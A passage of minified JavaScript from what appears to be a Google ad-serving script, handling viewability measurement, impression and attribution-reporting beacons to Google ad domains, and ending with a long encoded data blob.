            vc(null == c ? void 0 : null == (h = c.webkit) ? void 0 : null == (k = h.messageHandlers) ? void 0 : k.getGmaViewSignals, function (p) {
              V(cb) || (a.i = "&" + p);
            }, function () {});
          }
        }
      }
      T.umi && (e = new Y(function (p) {
        a.h = p;
      }), b.push(e));
      if (T.ebrpfa || V($a)) {
        var l = rc();
        b.push(l.promise);
        sb(a.g, function () {
          gc(a.g.body, l.resolve);
        });
      }
      3 == tc(a.g) && 3 == tc(a.g) && b.push(Sc(a));
      if (T.opxdv && a.m) {
        var n = rc();
        b.push(n.promise);
        e = x.omrhp;
        "function" === typeof e ? e(n.resolve) : (e = x.document.querySelector("script[data-jc='86']")) && e.addEventListener("load", function () {
          x.omrhp(n.resolve);
        });
      }
      a.o = qc(b);
    }
    function Tc(a) {
      var b = a.search(kb);
      var c = jb(a, 0, "ase", b);
      if (0 > c) b = null;else {
        var d = a.indexOf("&", c);
        if (0 > d || d > b) d = b;
        b = decodeURIComponent(a.slice(c + 4, -1 !== d ? d : 0).replace(/\+/g, " "));
      }
      if (b === 2 .toString()) {
        var e = x.document;
        e = void 0 === e ? document : e;
        var f;
        e = null != (f = e.featurePolicy) && f.allowedFeatures().includes("attribution-reporting") ? 6 : 5;
        f = a.search(kb);
        b = 0;
        for (d = []; 0 <= (c = jb(a, b, "nis", f));) d.push(a.substring(b, c)), b = Math.min(a.indexOf("&", c) + 1 || f, f);
        d.push(a.slice(b));
        d.join("").replace(lb, "$1");
        null != e && encodeURIComponent(String(e));
        e = !1;
        f = !0;
        e = void 0 === e ? !1 : e;
        f = void 0 === f ? !1 : f;
        x.fetch ? (e = {
          keepalive: !0,
          credentials: "include",
          redirect: "follow",
          method: "get",
          mode: "no-cors"
        }, f && (e.mode = "cors", "setAttributionReporting" in XMLHttpRequest.prototype ? e.attributionReporting = {
          eventSourceEligible: "true",
          triggerEligible: "false"
        } : e.headers = {
          "Attribution-Reporting-Eligible": "event-source"
        }), x.fetch(a, e)) : U(a, void 0, e, f);
      } else if (T.atsb) {
        e = void 0 === e ? !1 : e;
        if (f = x.navigator) f = x.navigator.userAgent, f = /Chrome/.test(f) && !/Edge/.test(f) ? !0 : !1;
        f && x.navigator.sendBeacon ? x.navigator.sendBeacon(a) : U(a, void 0, e);
      } else U(a);
    }
    function Qc() {
      var a = S(x).omid3p,
        b = !!a && "function" === typeof a.registerSessionObserver && "function" === typeof a.addEventListener;
      b || nb(function (c) {
        Oc(c) && (b = !0);
        return b;
      }, !0);
      return b;
    }
    function Sc(a) {
      return new Y(function (b) {
        var c = uc(a.g);
        if (c) {
          var d = function () {
            3 != tc(a.g) && (hb(a.g, c, d), b());
          };
          gb(a.g, c, d);
        }
      });
    }
    ;
    function Z() {
      return new Date().getTime();
    }
    function Uc() {
      try {
        var a = void 0 === a ? document : a;
        var b;
        return !(null == (b = a.featurePolicy) || !b.features().includes("attribution-reporting"));
      } catch (c) {
        return !1;
      }
    }
    function Vc(a) {
      var b = a.querySelector('a img[alt="Advertisement"]');
      return b && /^img_anch_/.test(b.parentElement.id) ? b : a;
    }
    function Wc(a, b) {
      this.I = a;
      this.u = this.i = this.g = !1;
      this.O = 1;
      this.m = T.eavp ? 1 : 0;
      this.h = T.ebrp ? 1 : 0;
      this.W = !!T.opxb;
      this.D = this.A = null;
      this.H = rc();
      this.N = Z();
      this.M = null;
      this.T = .001 > Math.random();
      this.P = T.eeid || "";
      this.C = this.o = null;
      this.U = (Math.random() + "").slice(-5);
      this.j = !1;
      this.B = null;
      this.K = 0;
      this.F = this.G = null;
      this.V = !!T.fld;
      this.S = T.adsg || "";
      this.Y = !!T.uffp;
      this.X = !!T.espa;
      if (a = !!T.aifbl) {
        var c, d;
        a = -1 != (null == (c = x.navigator) ? void 0 : null == (d = c.userAgent) ? void 0 : d.indexOf("Firefox"));
      }
      this.L = a;
      Xc(this, b);
    }
    var Yc;
    function Zc(a, b) {
      b && 0 !== a.h && (a.C = Z() - a.N, a.L && (b = Vc(b)), $c(a, b).then(function (c) {
        c && (a.A = c);
        a.u = !0;
        ad(a);
      }));
    }
    function bd() {
      try {
        nb(function (a) {
          a = a.document;
          if (db.length && a.head) for (var b = ea(db), c = b.next(); !c.done; c = b.next()) if ((c = c.value) && a.head) {
            var d = tb("META");
            a.head.appendChild(d);
            d.httpEquiv = "origin-trial";
            d.content = c;
          }
          return !1;
        }, !1);
      } catch (a) {}
    }
    function Xc(a, b) {
      Zc(a, b);
      bd();
      0 !== a.h || 0 !== a.m ? cd(a) ? dd(a).then(function () {
        ed(a);
      }) : ed(a) : a.B = 1;
      Zb(Pc).o.then(function () {
        a.g = !0;
        ad(a);
      });
      fd(a);
      ad(a);
    }
    function $c(a, b) {
      return new Y(function (c) {
        function d(e, f) {
          a.D = e;
          c(f);
        }
        nc(b, d);
        gc(b, d, !0, !1, void 0, !0, a.L);
      });
    }
    function cd(a) {
      a.j = Qc();
      a.B = a.j ? 4 : 1;
      return a.j;
    }
    function dd(a) {
      return new Y(function (b) {
        function c(e) {
          a.B = 3;
          e && (a.G = e.src, a.F = e.sdk);
          b();
        }
        var d = x.omrhp;
        "function" === typeof d ? d(c) : (d = x.document.querySelector("script[data-jc='86']")) && d.addEventListener("load", function () {
          x.omrhp(c);
        });
      });
    }
    function ed(a) {
      a.i = !0;
      ad(a);
    }
    function ad(a) {
      if (a.g) {
        var b = null,
          c = 0;
        2 !== a.O ? b = 0 : 1 === a.m && a.g && a.i ? b = 12 : 1 === a.h && a.g && a.i && a.u && (b = 11);
        if (null != b) a: {
          if (0 === b ? 1 === a.h && a.g && a.i && a.u ? c = 2 : 1 === a.m && a.g && a.i && (c = 1) : 12 === b && 1 === a.h && a.g && a.i && a.u && (c = 2), a.W && (a.T && "" !== a.I && a.j && (a.o || 0 !== b || gd(a, !0), 12 !== b && 1 !== c && 2 !== c || gd(a, !1)), 0 === b && 0 === c)) break a;
          var d = Z(),
            e = hd(a, b, c, d);
          0 === b && (a.O = 2, a.M = d);
          if (12 === b || c) a.m = 2;
          if (11 === b || 2 === c) a.h = 2;
          if (a.V) {
            e = new Ya();
            Q(e, 1, a.S);
            e = Xa(e);
            if (0 === b) {
              d = S(x);
              var f;
              null == d || null == (f = d.fence) || f.reportEvent({
                eventType: "impression",
                eventData: e,
                destination: ["buyer"]
              });
              var g;
              null == d || null == (g = d.fence) || g.reportEvent({
                eventType: "impression",
                destination: ["component-seller"]
              });
            }
            if (11 === b || 2 === c) {
              var h, k;
              null == (h = S(x)) || null == (k = h.fence) || k.reportEvent({
                eventType: "b2rimpression",
                eventData: e,
                destination: ["buyer"]
              });
            }
          } else e && (((f = a.X && Uc()) || a.Y) && x.fetch ? (g = {
            method: "GET",
            keepalive: !0
          }, f ? "setAttributionReporting" in XMLHttpRequest.prototype ? g.attributionReporting = {
            eventSourceEligible: !0,
            triggerEligible: !1
          } : g.headers = {
            "Attribution-Reporting-Eligible": "event-source"
          } : g.mode = "no-cors", x.fetch(eb(e, "&ftch=1"), g)) : Tc(e));
          0 === b && a.H.resolve();
        }
      }
    }
    function gd(a, b) {
      var c = null;
      b ? a.o = Z() : c = a.o ? Z() - a.o : "?";
      a = "https://pagead2.googlesyndication.com/pagead/gen_204?id=opxhb&evt=" + (b ? "d" : "o") + ("&eid=" + encodeURIComponent(a.P)) + (null == c ? "" : "&ttp=" + c);
      Tc(a);
    }
    function hd(a, b, c, d) {
      if ("" === a.I) return null;
      var e = {
        omid: a.j ? 1 : 0,
        rm: a.B,
        ctpt: d - a.N
      };
      0 !== b && (e.vt = b, e.dtpt = d - (a.M || 0));
      0 !== c && (e.cbvp = c);
      a.D && (e.dett = a.D);
      a.A && (e.beid = a.A.eventId, e.vend = a.A.vendor);
      null != a.C && (e.cstd = a.C);
      (b = T.bvst) && (e.cisv = b + ("." + a.U));
      0 !== a.K && (e.vwbs = a.K);
      a.G && (e.oprs = a.G);
      a.F && (e.opsd = a.F);
      (b = Zb(Pc).j) && (e.uach = b);
      e.arae = Number(Uc());
      var f = "";
      pb(e, function (g, h) {
        f += "&" + h + "=" + encodeURIComponent(g);
      });
      return eb(a.I, f);
    }
    function fd(a) {
      var b = a.P;
      if (b && (b = x["bllsn" + b], "function" === typeof b)) try {
        b(function (c) {
          c && (a.K = c.block ? 2 : 1);
        });
      } catch (c) {}
    }
    ;
    S().btrp = function (a, b) {
      var c = Yc = new Wc(a, b);
      return function (d) {
        Zc(c, d);
      };
    };
    S().pdib3 = function (a, b) {
      Yc.H.promise.then(function () {
        if (b) {
          var c = void 0 === c ? !1 : c;
          if (vb()) ub(window, a, null, !0, c);else {
            var d = x.document;
            if (d.body) {
              var e = d.getElementById("goog-srcless-iframe");
              e || (e = tb("IFRAME"), e.style.display = "none", e.id = "goog-srcless-iframe", d.body.appendChild(e));
              d = e;
            } else d = null;
            d && d.contentWindow && ub(d.contentWindow, a, null, !0, c);
          }
        } else U(a);
      });
    };
    S().vv = function () {
      var a = Zb(Pc);
      if (!a.h) throw Error("aiv::err");
      a.h();
    };
    S().sasrc = function (a) {
      Yc.H.promise.then(function () {
        var b = x.document.createElement("img");
        b.style.display = "none";
        b.attributionSrc = a;
        x.document.body.appendChild(b);
      });
    };
  }).call(this);
  window.stcc = btrp("https://googleads4.g.doubleclick.net/pcs/view?xai\x3dAKAOjsvKhXBmTRv6Y36V2BM482T4e9x1CihpxC5EhXivFw0AZAESJjRpv39iOHNTE93rqyTAML34TLLWyQ3BN3cO7FryRI1vNykjFura565mgR2csFkvkeRuF1Dop1tgsNp2Vn011jFDYe1K-9eOA43XfesgKpRdrDA-wbBxUibFlw\x26sai\x3dAMfl-YQoS7skOaBYLE6c7GjYAdwscZs4f6hx7c7jCItuJi3X7VLAmIUt9E7vFn3Seh-zRLyvu0XItcRPqIAtTU-p1zNQqNkal_nFPHrHPw\x26sig\x3dCg0ArKJSzNtORG8cgtaDEAE\x26uach_m\x3d[UACH]\x26cry\x3d1\x26fbs_aeid\x3d[gw_fbsaeid]\x26urlfix\x3d1\x26adurl\x3d", document.getElementById("gcc_zM_gZKKgJ86g7OsP9byngA8"));
})();
(function () {
  if (!window.GoogleTyFxhY || typeof window.GoogleTyFxhY.push !== 'function') {
    window.GoogleTyFxhY = [];
  }
  window.GoogleTyFxhY.push({
    '_scs_': 'BLgbmzM_gZKKgJ86g7OsP9byngA8AAAAAOAHgBAI',
    '_bgu_': 'https://pagead2.googlesyndication.com/bg/VOYjWJ9SYKUWeq_SiXQPiq5A6-bg1q_inShFnttaRxg.js',
    '_bgp_': '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